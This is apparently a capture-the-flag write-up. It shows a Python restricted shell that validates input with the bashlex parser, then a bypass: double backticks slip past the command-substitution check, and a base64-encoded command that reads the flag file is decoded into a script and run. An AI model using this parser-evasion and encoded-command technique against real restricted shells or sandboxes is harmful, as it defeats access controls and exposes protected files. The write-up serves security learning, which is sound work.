# bashlex

**Category**: Misc \
**Tags**: `restricted shell`, `easy` \
**Points**: 100 (47 solves) \
**Author**: mrtumble

## Challenge

We made a new restricted shell with fancy AST validation, and we don't allow cat!
The flag is in `/home/bashlex/flag.txt`.

`nc 34.90.44.21 1337`

## Solution

```python
ALLOWED_COMMANDS = ['ls', 'pwd', 'id', 'exit']

def validate(ast):
    queue = [ast]
    while queue:
        node = queue.pop(0)
                ...
                elif first_child.word.startswith(('.', '/')):
                    print('Path components are forbidden')
                    return False
                elif first_child.word.isalpha() and \
                        first_child.word not in ALLOWED_COMMANDS:
                    print('Forbidden command')
                    return False
        elif node.kind == 'commandsubstitution':
            print('Command substitution is forbidden')
            return False
        elif node.kind == 'word':
            if [c for c in ['*', '?', '['] if c in node.word]:
                print('Wildcards are forbidden')
                return False
            elif 'flag' in node.word:
                print('flag is forbidden')
                return False
        ...
    return True

while True:
    inp = input('> ')

    try:
        parts = bashlex.parse(inp)
        pprint(parts)
        valid = True
        for p in parts:
            pprint(p)
            if not validate(p):
                valid = False
    except:
        print('ERROR')
        continue

    if not valid:
        print('INVALID')
        continue

    subprocess.call(['bash', '-c', inp])
```

Basically it needs to pass `bashlex` validation but still cat the flag.
After some guessing I found this:
```
$ nc 34.90.44.21 1337
> ``echo hi``
hi
>
```

Now that we have nearly complete access to the shell, we can just do:
```
> ``echo Y2F0IC9ob21lL2Jhc2hsZXgvZmxhZy50eHQK | base64 -d > /tmp/shit.sh``
> ``cat /tmp/shit.sh``
cat /home/bashlex/flag.txt
> ``sh /tmp/shit.sh``
union{chomsky_go_lllllllll1}
>
```
